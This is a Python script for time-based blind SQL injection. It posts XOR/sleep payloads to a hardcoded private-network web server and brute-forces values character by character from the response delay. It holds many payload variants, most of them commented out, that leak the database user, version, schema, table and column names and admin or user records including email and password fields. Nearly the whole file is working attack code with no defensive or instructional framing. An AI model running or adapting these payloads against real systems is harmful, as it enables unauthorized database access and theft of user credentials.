#!/usr/bin/env python3

import requests
import string
import time
import sys, re

######### tool from HiMiC
# user() *****@localhost
# version() 5.5.52-mariadb
# database() *****
# system_user()
# @@datadir /var/lib/mysql/

#########
def bruteforcer():

# Выбираем буквы цифры какие будем брутфорсить
#    chars = string.printable[:-6]
    chars = " 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&'()*+,-./:;<=>?@[\]^_`{|}~"
    #chars = " 0123456789abcdefghijklmnopqrstuvwxyz!#$%&'()*+,-./:;<=>?@[\]^_`{|}~"
    #chars = range(32,123)

    print(chars)
    session =  requests.session()
    url = "http://172.23.143.87/"
    
    admin_password = ""
    print(len(admin_password))
#    len_char = len(admin_password)+1
    len_char = 0+1

#    exit()
    while True:
        for char in chars:
            name = f"{char}"
#            name_char = f"{admin_password}"
            # print(name)
#            print(name_char)
            # exit()
            len_char = len(admin_password)+1
            sys.stdout.write(f"\r[+] Database version: {admin_password} ")
            sys.stdout.write(f"\r[+] Database version2: {admin_password} ")
            #leak the datbase name being used
            #payload = f"id=1'XOR(if(substring(user(),{len_char},1)='{name}',sleep(5),0))XOR'Z&submit=Send"
            
            #payload = f"name=592173392'XOR(if(substring(user(),{len_char},1)='{name}',sleep(5),0))XOR'Z  -- -&sort=desc"
            #payload = f"name=592173392'XOR(if(substring(version(),{len_char},1)='{name}',sleep(5),0))XOR'Z  -- -&sort=desc"
            #payload = f"name=592173392'XOR(if(substring(user(),{len_char},1)='{name}',sleep(5),0))XOR'Z  -- -&sort=desc"
            #payload = f"name=592173392'XOR(if(substring(database(),{len_char},1)='{name}',sleep(5),0))XOR'Z  -- -&sort=desc"
            #payload = f"name=592173392'XOR(if(substring((select/**/count(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema='sql_order_db'),{len_char},1)={name},sleep(5),0))XOR'  -- -&sort=desc"
            #payload = f"name=592173392'XOR(if(substring((select/**/group_concat(0x3a,table_name,0x3a,column_name)/**/from/**/information_schema.tables/**/where/**/table_schema='0x73716c5f6f726465725f6462'),{len_char},1)='{name}',sleep(5),0))XOR'  -- -&sort=desc"  
            #payload = f"name=592173392'XOR(if(substring((select table_name from information_schema.tables where table_schema=0x73716c5f6f726465725f6462),{len_char},1)='{name}',sleep(5),0))XOR'  -- -&sort=desc" 
            #payload = f"name=592173392'XOR(if(substring((select group_concat(0x3a,table_name,0x3a) from information_schema.tables where table_schema=0x73716c5f6f726465725f6462),{len_char},1)='{name}',sleep(5),0))XOR'  -- -&sort=desc" 
            
            payload = f"name=592173392'XOR(if(substring((select group_concat(0x3a,id,0x3a,name) from users where id=592173392),{len_char},1)='{name}',sleep(5),0))XOR'  -- -&sort=desc" 
            payload = f"name=592173392'XOR(if(substring((select group_concat(name) from users where id=592173392),{len_char},1)='{name}',sleep(1),0))XOR'  -- -&sort=desc" 
            
             
            #payload = f"name=592173392'XOR(if(substring((select/**/hex(group_concat(':',table_name,0x3a,column_name))/**/from/**/information_schema.columns/**/where/**/table_name='users'),{len_char},1)={name},sleep(5),0))XOR'  -- -&sort=desc"
            #payload = f"name=592173392'XOR(if(substring((select/**/hex(group_concat(column_name))/**/from/**/information_schema.columns/**/where/**/table_name='users'),{len_char},1)={name},sleep(5),0))XOR'  -- -&sort=desc"
            #payload = f"name=592173392'XOR(if(substring((select/**/group_concat(column_name,0x3a)/**/from/**/information_schema.columns/**/where/**/table_name='users'),{len_char},1)='{name}',sleep(5),0))XOR'  -- -&sort=desc"
            #payload = f"name=592173392'XOR(if(substring((select/**/group_concat(column_name,0x3a)/**/from/**/information_schema.columns/**/where/**/table_schema='0x73716c5f6f726465725f6462'/**/and/**/table_name='users'),{len_char},1)='{name}',sleep(5),0))XOR'  -- -&sort=desc"
            #payload = f"name=base'#&phone=0&email=1&message=1"
            
            #payload = f"print-0'XOR(if(substring(user(),{len_char},1)='{name}',sleep(5),0))XOR'Z.html"
#            payload = f"print-0'XOR(if(substring(version(),{len_char},1)='{name}',sleep(5),0))XOR'Z.html"
#            payload = f"print-0'XOR(if(substring(database(),{len_char},1)='{name}',sleep(5),0))XOR'Z.html"
            # payload = f"print-0'XOR(if(substring(system_user(),{len_char},1)='{name}',sleep(5),0))XOR'Z.html"
            #payload = f"print-0'XOR(if(substring(@@datadir,{len_char},1)='{name}',sleep(5),0))XOR'Z.html" # работает
#            payload = f"print-0'XOR(if(substring(SELECT+TABLE_SCHEMA,TABLE_NAME+FROM+information_schema.tables;,{len_char},1)='{name}',sleep(5),0))XOR'Z.html"
#  @@hostname = 10868
# system_user() =  user@localhost
#            payload = f"print-0'XOR(if(substring(hex(database()),{len_char},1)='{name}',sleep(5),0))XOR'Z.html"
# сколько таблиц  в БД YOU_DATA_BASE_NAME = 31
#            payload = f"print-615'XOR(if(substring((select/**/count(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema='YOU_DATA_BASE_NAME'),{len_char},1)={name},sleep(5),0))XOR'"
# Теперь посмотрим какие таблицы в текущей базе. = 
#            payload = f"print-615'XOR(if(substring((select/**/hex(group_concat(table_name))/**/from/**/information_schema.tables/**/where/**/table_schema='YOU_DATA_BASE_NAME'),{len_char},1)={name},sleep(5),0))XOR'"
# вытаскиваем структуру с таблицы webxPadmins
#            payload = f"print-615'XOR(if(substring((SELECT/**/hex(GROUP_CONCAT(column_name))/**/FROM/**/INFORMATION_SCHEMA.columns/**/WHERE/**/TABLE_SCHEMA='YOU_DATA_BASE_NAME'),{len_char},1)={name},sleep(5),0))XOR'"
#            payload = f"print-615'XOR(if(substring((select/**/hex(group_concat(':',table_name,0x3a,column_name))/**/from/**/information_schema.columns/**/where/**/table_schema='YOU_DATA_BASE_NAME'),{len_char},1)={name},sleep(5),0))XOR'"
#            payload = f"print-615'XOR(if(ascii(substring((select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_schema='YOU_DATA_BASE_NAME'/**/limit/**/1,1),{len_char},1))={name},sleep(5),0))XOR'"
#            payload = f"print-615'XOR(if(ascii(substring((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema='YOU_DATA_BASE_NAME'),{len_char},1))={name},sleep(5),0))XOR'"
#            payload = f"print-615'XOR(if(ascii(substring((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema='YOU_DATA_BASE_NAME'/**/and/**/table_name='webx_users'),{len_char},1))={name},sleep(5),0))XOR'"
#            payload = f"print-615'XOR(if(ascii(substring((select/**/group_concat(id,0x3a,name,0x3a,email,0x3a,pwd)/**/from/**/YOU_DATA_BASE_NAME.webx_admins/**/limit/**/0,1),{len_char},1))={name},sleep(5),0))XOR'"
            #payload = f"print-615'XOR(if(ascii(substring((select/**/group_concat(user_id,0x3a,user_name,0x3a,user_email,0x3a,user_password)/**/from/**/YOU_DATA_BASE_NAME.webx_users/**/limit/**/0,1),{len_char},1))={name},sleep(5),0))XOR'"
            time_started = time.time()
            #url2 = url+payload
            url2 = url
            print(' ')
            print(url2)
            print(payload)
#            print(' ')
            #output = session.get(url2, allow_redirects = False, stream=True)
            #data = payload
            headers =({'Content-Type': 'application/x-www-form-urlencoded'})
            req = requests.post( url2, data=payload, headers=headers, timeout=40)
            
            #req = requests('POST', url2, data=payload, headers=headers)
            #req = requests('POST', url2, data=payload, headers=headers)
            #prepped = req.prepare()
            
            print(req.text)
            #result = re.findall(r'<pre>\S+<pre>', req.text)
            #print(result)
            
# делаем что-то с prepped.body
#prepped.body = 'No, I want exactly this as the body.'

# делаем что-то с prepped.headers
#del prepped.headers['Content-Type']

            #output = session.send(prepped, stream=stream, verify=verify, proxies=proxies, cert=cert, timeout=timeout)
            
            
            time_finished = time.time()
            time_taken = time_finished - time_started
            print(time_taken)
            if time_taken < 5:
                pass
            elif char == "%":
                pass
            else:
                print(' ')
                print(url2)
                print(admin_password)
                print(' ')
                admin_password += char
 #               admin_password += chr(char)
                break


if __name__ == ("__main__"):
    bruteforcer()
